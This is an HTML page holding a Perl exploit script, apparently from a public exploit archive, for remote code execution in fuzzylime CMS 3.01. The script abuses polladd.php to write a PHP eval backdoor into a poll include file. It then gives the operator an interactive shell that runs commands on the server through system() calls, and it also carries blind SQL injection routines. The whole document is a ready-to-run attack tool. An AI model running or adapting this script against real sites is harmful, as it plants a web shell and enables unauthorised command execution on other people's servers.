<html><head><title>fuzzylime cms 3.01 (polladd.php poll) Remote Code Execution Exploit (pl)</title></head><pre>#!/usr/bin/perl 
#!!UPDATED!!!!UPDATED!!!!UPDATED!!!!UPDATED!!!!UPDATED!!!!UPDATED!!!!UPDATED!!
#after i noticed that there was a problem changing $cmd,i fixed it.this is the result.
##
## Fuzzylime 3.01 Remote Code Execution
## Credits: real and inphex
##
## [C:\]# perl ye.pl host /path/
## :&gt;id
## uid=63676(dswrealty) gid=888(vusers) groups=33(www-data)
##

use LWP::UserAgent;
use HTTP::Cookies;
use Switch;


$host_ = &quot;http://&quot;.shift;
$path_ = shift;
$info{'info'} = { 
	&quot;description&quot; =&gt; [&quot;#################################################\nFuzzyLime Remote Code Execution\n#################################################\nreal &amp; inphex\n&quot;],
	&quot;options&quot; =&gt;
	{
		&quot;agent&quot; =&gt; &quot;&quot;,  
		&quot;proxy&quot; =&gt; &quot;&quot;,  
		&quot;default_headers&quot; =&gt; [  
			[&quot;key&quot;,&quot;value&quot;]], 
		&quot;timeout&quot; =&gt; 2, 
		&quot;cookie&quot; =&gt;     
		{
			&quot;cookie&quot; =&gt; [&quot;&quot;],
		},
	},
	&quot;sending_options&quot; =&gt;
	{
			&quot;host&quot; =&gt; $host_, 
			&quot;path&quot; =&gt; $path_.&quot;code/polladd.php&quot;,  
		    &quot;port&quot; =&gt; 80,                  
			&quot;method_a&quot; =&gt; &quot;REMOTE_CODE_EXECUTION&quot;,  
			&quot;attack&quot; =&gt;
		{
    			&quot;poll&quot; =&gt; [&quot;get&quot;,&quot;poll&quot;,&quot;....//swear&quot;],
				&quot;log&quot; =&gt; [&quot;get&quot;,&quot;log&quot;,&quot;1&quot;],
				&quot;_SERVER[REMOTE_ADDR]&quot; =&gt; [&quot;get&quot;,&quot;_SERVER[REMOTE_ADDR]&quot;,&quot;\&quot;;eval(\&quot;\$_POST[cmd]\&quot;); ?&gt;&quot;],
		},
	},

};

&amp;start($info{'info'},222);

while () {
	print &quot;:&gt;&quot;;
	$cmd = &lt;STDIN&gt;;
	chomp($cmd);
	$info1{'info1'} = { &quot;options&quot; =&gt;{&quot;agent&quot; =&gt; &quot;&quot;,  &quot;proxy&quot; =&gt; &quot;&quot;,  &quot;default_headers&quot; =&gt; [  [&quot;key&quot;,&quot;value&quot;]], &quot;timeout&quot; =&gt; 2, &quot;cookie&quot; =&gt;     {&quot;cookie&quot; =&gt; [&quot;&quot;],},},&quot;sending_options&quot; =&gt;{&quot;host&quot; =&gt; $host_, &quot;path&quot; =&gt; $path_.&quot;code/polls/swear.inc.php&quot;,  &quot;port&quot; =&gt; 80,                  &quot;method_a&quot; =&gt; &quot;REMOTE_CODE_EXECUTION&quot;,  &quot;attack&quot; =&gt;{
    			&quot;cmd&quot; =&gt; [&quot;post&quot;,&quot;cmd&quot;,&quot;system('&quot;.$cmd.&quot;');&quot;],},},};
	&amp;start($info1{'info1'},221);
	print ${$info1{'info1'}}{221}{'content'};
}


sub start
{
	
	$a_ = shift;
	$id = shift;
	$post_dA = &quot;&quot;;
	$get_dA = get_d_p_s(&quot;get&quot;);
	$post_dA = get_d_p_s(&quot;post&quot;);

	my ($x,$c,$m,$h,$ff,$kf,$hp,$c,$cccc) = (0,0,0,0,0,0,0,0,0);
    $jj = 1;
	$ii = 48;
    $hh = 1;
	$ppp = 0;
	$s = shift;
	$a = &quot;&quot;;
	$res_p = &quot;&quot;;
	$h = &quot;&quot;;
	$ua= &quot;&quot;;
	$agent= &quot;&quot;;
	$k= &quot;&quot;;
	$v= &quot;&quot;;
	$get_data= &quot;&quot;;
	$post_data= &quot;&quot;;
	$header_dA = &quot;&quot;;
	$h_host_h_xdsjaop = $a_-&gt;{'sending_options'}{'host'};
	$h_path_h_xdsjaop = $a_-&gt;{'sending_options'}{'path'};
	$h_port_h_xdsjaop = $a_-&gt;{'sending_options'}{'port'};
	$method_m = $a_-&gt;{'sending_options'}{'method_a'};
	$ua = LWP::UserAgent-&gt;new;
	$ua-&gt;timeout($a_-&gt;{'options'}{'timeout'});  
	if ($a_-&gt;{'options'}{'proxy'}) {
	    $ua-&gt;proxy(['http', 'ftp'] =&gt; $a_-&gt;{'options'}{'proxy'});
	}
	$agent = $a_-&gt;{'options'}{'agent'} || &quot;Mozilla/5.0&quot;; 
	$ua-&gt;agent($agent); 
	{                                                 
		while (($k,$v) = each(%{$a_}))
			{
			if ($k ne &quot;options&quot; &amp;&amp; $k ne &quot;sending_options&quot;)
				{
				foreach $r (@{$a_-&gt;{$k}})
					{
						print $a_-&gt;{$k}[0];
					}
				}
			}


		foreach $j (@{$a_-&gt;{'options'}{'default_headers'}})
			{    
			$ua-&gt;default_headers-&gt;push_header($a_-&gt;{'options'}{'default_headers'}[$m][0] =&gt; $a_-&gt;{'options'}{'default_headers'}[$m][1]);
			$m++;
			}

		if ($a_-&gt;{'options'}{'cookie'}{'cookie'}[0])
			{          
			$ua-&gt;default_headers-&gt;push_header('Cookie' =&gt; $a_-&gt;{'options'}{'cookie'}{'cookie'}[0]);
			}

			

	}
	switch ($method_m)        
	{
		case &quot;attack&quot; { &amp;attack();}
		case &quot;SQL_INJECTION_BLIND&quot; { &amp;sql_injection_blind();}
		case &quot;REMOTE_COMMAND_EXECUTION&quot; { &amp;attack();}
		case &quot;REMOTE_CODE_EXECUTION&quot; {&amp;attack();}
		case &quot;REMOTE_FILE_INCLUSION&quot; { &amp;attack();}
		case &quot;LOCAL_FILE_INCLUSION&quot; { &amp;attack(); }
		else { &amp;attack(); }  

	}


	sub attack
	{
		my ($jj);
		my ($h);
		my($x);
		if ($post_dA eq &quot;&quot;) {
			$method = &quot;get&quot;;
		} elsif ($post_dA ne &quot;&quot;)
		{
			$method = &quot;post&quot;;
		}
		if ($method eq &quot;get&quot;) {  
			$res_p = get_data($h_host_h_xdsjaop,$h_path_h_xdsjaop.&quot;?&quot;.$get_dA);
			${$a_}{$id}{'content'} = $res_p;
			foreach $a (@{$a_-&gt;{'sending_options'}{'attack'}{'regex'}})
				{
				$res_p =~ /$a_-&gt;{'sending_options'}{'attack'}{'regex'}[$h][0]/;
				
				while ($jj &lt;= $a_-&gt;{'sending_options'}{'attack'}{'regex'}[$h][1])
					{
					if (${$jj} ne &quot;&quot;)
						{
						${$a_}{$id}{'regex'}[$h][$x] = ${$jj};
						$x++;
						}
						$jj++;
					}
					
					$h++;
				}
		} elsif ($method eq &quot;post&quot;)
		{
			$res_p = post_data($h_host_h_xdsjaop,$h_path_h_xdsjaop.&quot;?&quot;.$get_dA,&quot;application/x-www-form-urlencoded&quot;,$post_dA);
		
			${$a_}{$id}{'content'} = $res_p;

			foreach $a (@{$a_-&gt;{'sending_options'}{'attack'}{'regex'}})
				{
				$res_p =~ /$a_-&gt;{'sending_options'}{'attack'}{'regex'}[$h][0]/;
				while ($jj &lt;= $a_-&gt;{'sending_options'}{'attack'}{'regex'}[$h][1])
					{
					if (${$jj} ne &quot;&quot;)
						{
						${$a_}{$id}{'regex'}[$h][$x] = ${$jj};
						$x++;
						}
						$jj++;
					}
					$h++;
				}
		}

	}
	sub sql_injection_blind
	{
		while ()
			{
			while ($ii &lt;= 120)
				{
				
				$itsx = &quot;[&quot;.chr($ii).&quot;]&quot;;
				$l = length($itsx);
				$b = (&quot;\b&quot;)x$l;
				syswrite STDOUT,$b.$itsx;

				if(check($ii,$hh) == 1)
				{
					syswrite STDOUT,$b.chr($ii).&quot;---&quot;;
					$hh++;
					$chr = $chr.chr($ii);
					}
					$ii++;
			}
			push(@ffs,length($chr)); 
			if (($#ffs - 999) == $ffs)
				{
				exit;
				}
				$ii = 48;
		}
	}
	sub check($$)
	{
		my ($h);
		my ($a);
		$ii = shift;
		$hh = shift;

		if (get_d_p_s(&quot;post&quot;) ne &quot;&quot;)
			{
			$method = &quot;post&quot;;
		} else { $method = &quot;get&quot;;}
		if ($method eq &quot;get&quot;)
			{
			$ppp++;
			$query = modify($get_dA,$ii,$hh);
			$res_p = get_data($h_host_h_xdsjaop,$a_-&gt;{'sending_options'}{'path'}.&quot;?&quot;.$query);

			foreach $a (@{$a_-&gt;{'sending_options'}{'attack'}{'regex'}})
				{
				if ($res_p =~m/$a_-&gt;{'sending_options'}{'attack'}{'regex'}[$h][0]/)
					{
					if ($a_-&gt;{'sending_options'}{'attack'}{'regex'}[$h][2] == 1) {
						return 1;
					} else { return 0;}
					}
					else 
				{
						if ($a_-&gt;{'sending_options'}{'attack'}{'regex'}[$h][2] == 1) {
							return 0;
						}else { return 1;}
	
						
				}
				$h++;
			}
		} elsif ($method eq &quot;post&quot;)
			{
			$ppp++;
			$query_g = modify($get_dA,$ii,$hh);
			$query_p = modify($post_dA,$ii,$hh);
			
			$res_p = post_data($h_host_h_xdsjaop,$a_-&gt;{'sending_options'}{'path'}.&quot;?&quot;.$query_g,&quot;application/x-www-form-urlencoded&quot;,$query_p);
			foreach $a (@{$a_-&gt;{'sending_options'}{'attack'}{'regex'}})
				{
				if ($res_p =~m/$a_-&gt;{'sending_options'}{'attack'}{'regex'}[$h][0]/)
					{
					return 1;
					}
					else 
					{
						return 0;
					}
				$h++;
			}
		}
	}
    sub modify($$$)
	{
	    $string = shift;
	    $replace_by = shift;
	    $replace_by1 = shift;

	    if ($string !~/\$i/ &amp;&amp; $string !~/\$h/) {
		    return $string;
	        } elsif ($string !~/\$i/)
		{
		        $ff = substr($string,0,index($string,&quot;\$h&quot;));
	            $ee =  substr($string,rindex($string,&quot;\$h&quot;)+2);
	            $string = $ff.$replace_by1.$ee;

	            return $string;
		} elsif ($string !~/\$h/)
		{
	        $f = substr($string,0,index($string,&quot;\$i&quot;));
	        $e = substr($string,rindex($string,&quot;\$i&quot;)+2);
	        $string = $f.$replace_by.$e;
		    return $string;
		} else
		{
		    $f = substr($string,0,index($string,&quot;\$i&quot;));
	        $e = substr($string,rindex($string,&quot;\$i&quot;)+2);
	        $string = $f.$replace_by.$e;

		    $ff = substr($string,0,index($string,&quot;\$h&quot;));
	        $ee =  substr($string,rindex($string,&quot;\$h&quot;)+2);
	        $string = $ff.$replace_by1.$ee;

		    return $string;
		}
	}
	sub get_d_p_s
	{
		$k = 0;
		$v = 0;
		$g_d_p_s = shift;

		@post = ();
		@get = ();
		
		$post_data = &quot;&quot;;
		$get_data = &quot;&quot;;
		$header_data = &quot;&quot;;
		%header_dA = ();
		$p = &quot;&quot;;
		$g = &quot;&quot;;
		while (($k,$v) = each(%{$a_-&gt;{'sending_options'}{'attack'}}))
			{
			if ($a_-&gt;{'sending_options'}{'attack'}{$k}[0] =~/post/)
				{
				$p .= $a_-&gt;{'sending_options'}{'attack'}{$k}[1].&quot;=&quot;.$a_-&gt;{'sending_options'}{'attack'}{$k}[2].&quot;&amp;&quot;;
				} elsif ($a_-&gt;{'sending_options'}{'attack'}{$k}[0] =~/get/) {
					$g .= $a_-&gt;{'sending_options'}{'attack'}{$k}[1].&quot;=&quot;.$a_-&gt;{'sending_options'}{'attack'}{$k}[2].&quot;&amp;&quot;;
				} elsif ($a_-&gt;{'sending_options'}{'attack'}{$k}[0] =~ &quot;header&quot;)
				{
				        $header_dA{$a_-&gt;{'sending_options'}{'attack'}{$k}[1]} = $a_-&gt;{'sending_options'}{'attack'}{$k}[2];
				}
			}
		if ($g_d_p_s eq &quot;get&quot;)
			{
			return $g;
			}
			elsif ($g_d_p_s eq &quot;post&quot;)
		{
			return $p;
		} elsif ($g_d_p_s eq &quot;header&quot;)
		{
			return %header_dA;
		}

			@a_ = ();
	}
	sub get_data
	{
		$h_host_h_xdsjaop = shift;
		$h_path_h_xdsjaop = shift;
		%hash = get_d_p_s(&quot;header&quot;);
	    while (($u,$c) = each(%hash))
			{
			$ua-&gt;default_headers-&gt;push_header($u =&gt; $c);
			}
		$req = $ua-&gt;get($h_host_h_xdsjaop.&quot;:&quot;.$a_-&gt;{'sending_options'}{'port'}.$h_path_h_xdsjaop);
		return $req-&gt;content;
	}
	sub post_data
	{
		$h_host_h_xdsjaop = shift;
		$h_path_h_xdsjaop = shift;
		$content_type = shift;
		$send = shift;
		%hash = get_d_p_s(&quot;header&quot;);
	    while (($u,$c) = each(%hash))
			{
		    $ua-&gt;default_headers-&gt;push_header($u =&gt; $c);
			}
		$req = HTTP::Request-&gt;new(POST =&gt; $h_host_h_xdsjaop.&quot;:&quot;.$a_-&gt;{'sending_options'}{'port'}.$h_path_h_xdsjaop);
		$req-&gt;content_type($content_type);
		$req-&gt;content($send);
		$res = $ua-&gt;request($req);
		return $res-&gt;content;
	}

}

# milw0rm.com [2008-07-12]</pre></html>